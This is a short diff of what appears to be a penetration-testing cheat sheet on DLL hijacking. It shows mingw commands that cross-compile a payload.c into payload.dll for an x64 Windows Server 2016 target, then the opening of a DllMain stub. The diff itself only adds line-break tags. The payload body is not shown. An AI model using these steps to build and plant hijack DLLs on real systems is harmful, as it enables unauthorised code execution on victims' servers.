@@ -1,9 +1,9 @@
 ## DLL hijacking, Compiling dll on Kali, target x64 Win Server 2016
 
 ------
-`x86_64-w64-mingw32-gcc payload.c -shared -o payload.dll`
-`x86_64-w64-mingw32-g++ payload.c -lws2_32 -shared -o payload.dll `
-`sudo apt-get install mingw-w64`
+`x86_64-w64-mingw32-gcc payload.c -shared -o payload.dll` </br>
+`x86_64-w64-mingw32-g++ payload.c -lws2_32 -shared -o payload.dll ` </br>
+`sudo apt-get install mingw-w64` </br>
 <pre><code>#include <windows.h>
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
